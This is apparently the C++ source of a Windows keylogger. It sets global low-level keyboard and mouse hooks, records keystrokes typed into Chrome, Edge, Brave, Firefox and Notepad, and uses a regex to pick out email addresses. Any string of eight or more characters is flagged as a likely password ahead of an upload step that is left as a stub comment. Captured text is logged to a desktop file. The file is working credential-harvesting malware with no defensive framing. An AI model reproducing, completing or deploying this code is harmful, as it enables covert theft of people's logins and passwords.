#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <ctime>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// --- LOGGING SYSTEM ---
void WriteLog(std::string text) {
    char desktopPath[MAX_PATH];
    // Get the path to the current user's desktop
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
        std::string fullPath = std::string(desktopPath) + "\\monitor_log.txt";
        std::ofstream logFile(fullPath, std::ios::app);
        if (logFile.is_open()) {
            // Add a timestamp to every entry
            std::time_t now = std::time(0);
            char dt[26];
            ctime_s(dt, sizeof(dt), &now);
            std::string timeStr(dt);
            timeStr.erase(timeStr.find_last_not_of(" \n\r\t") + 1); // Clean newline

            logFile << "[" << timeStr << "] " << text << std::endl;
            logFile.close();
        }
    }
}

// --- TARGET LIST ---
std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "notepad.exe" };

bool IsTargetAppActive() {
    DWORD processId;
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    GetWindowThreadProcessId(hwnd, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (hProcess) {
        char buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (QueryFullProcessImageNameA(hProcess, 0, buffer, &size)) {
            std::string path(buffer);
            std::string exeName = path.substr(path.find_last_of("\\/") + 1);
            std::transform(exeName.begin(), exeName.end(), exeName.begin(), ::tolower);
            for (const std::string& target : TARGET_APPS) {
                if (exeName == target) {
                    CloseHandle(hProcess);
                    return true;
                }
            }
        }
        CloseHandle(hProcess);
    }
    return false;
}

// --- LOGIC ---
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

void ProcessBuffer() {
    if (buffer.empty()) return;
    WriteLog("Processing Buffer: " + buffer);

    if (IsEmail(buffer)) {
        savedEmail = buffer;
        WriteLog("Detected Email: " + savedEmail);
    } else if (buffer.length() >= 8) {
        WriteLog("Detected Potential Password. Sending Data...");
        // UploadData logic here
        savedEmail.clear();
    }
    buffer.clear();
}

// --- HOOKS ---
LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        if (IsTargetAppActive()) {
            KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
            if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
                ProcessBuffer();
            } else {
                // Character mapping...
                char c = (char)k->vkCode; 
                buffer += c; 
            }
        }
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) {
        if (IsTargetAppActive()) {
            WriteLog("Mouse Click in Target App - Triggering Buffer Process");
            ProcessBuffer();
        }
    }
    return CallNextHookEx(NULL, n, w, l);
}

// --- ENTRY ---
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    WriteLog("=== PROGRAM STARTED ===");

    // Install Hooks
    HHOOK hKey = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, h, 0);
    if (!hKey) WriteLog("ERROR: Keyboard hook failed!");
    else WriteLog("SUCCESS: Keyboard hook active.");

    HHOOK hMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, h, 0);
    if (!hMouse) WriteLog("ERROR: Mouse hook failed!");
    else WriteLog("SUCCESS: Mouse hook active.");

    // Keep program alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    WriteLog("=== PROGRAM EXITING ===");
    return 0;
}
